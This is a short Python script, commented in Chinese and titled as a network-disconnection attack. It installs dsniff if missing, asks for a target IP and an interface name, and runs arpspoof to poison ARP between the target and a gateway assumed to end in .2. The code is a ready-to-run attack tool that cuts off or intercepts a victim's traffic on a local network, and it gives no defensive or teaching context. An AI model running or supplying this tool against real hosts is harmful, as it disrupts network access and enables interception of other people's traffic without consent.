# -*- coding: utf-8 -*-
"""断网攻击

"""
import os


# 检测安装
def check_setup():
    # yum -y install libICE  libSM  libXmu libpcap libnet  libXext libXext-devel libXt
    resp = os.popen('rpm -qa |grep dsniff |grep "dsniff"').read()
    if len(resp) == 0:
        os.system("yum -y install libICE  libSM  libXmu libpcap libnet  libXext libXext-devel libXt")
        os.system("yum -y install dsniff.rpm libnids.rpm")


# 攻击
def attack(target_host, network_card_name):
    import re
    ip_target = re.findall("\d{1,3}.\d{1,3}.\d{1,3}", target_host)
    cmd = f"arpspoof -i {network_card_name} -t {target_host} -r {ip_target[0]}.2"
    os.system(cmd)


if __name__ == '__main__':
    check_setup()
    host = input("靶机IP是多少？")
    network_card_name = input("网卡名称：")
    attack(host, network_card_name)
